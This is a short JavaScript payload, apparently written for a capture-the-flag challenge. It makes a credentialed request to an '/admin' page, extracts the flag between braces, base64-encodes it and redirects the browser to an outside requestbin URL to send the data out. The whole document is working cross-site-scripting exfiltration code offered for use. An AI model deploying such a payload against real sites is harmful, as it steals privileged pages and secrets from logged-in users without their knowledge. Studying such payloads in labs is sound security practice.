// Search the admin page for JUST the flag!

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() { 
    if (xhr.readyState == 4) 
    {
            x = xhr.response.indexOf("{")
            y = xhr.response.indexOf("}")
            flag = xhr.response.substring(x,y)
            if(xhr.response == ""){ return; }
            else{
                document.location = 'http://requestbin.fullcontact.com/1ec6u9w1?data='+encodeURI(btoa(flag));
            }
    }
}
url = "/admin"
xhr.open('GET', url,true);
xhr.withCredentials = true;

xhr.send(null);

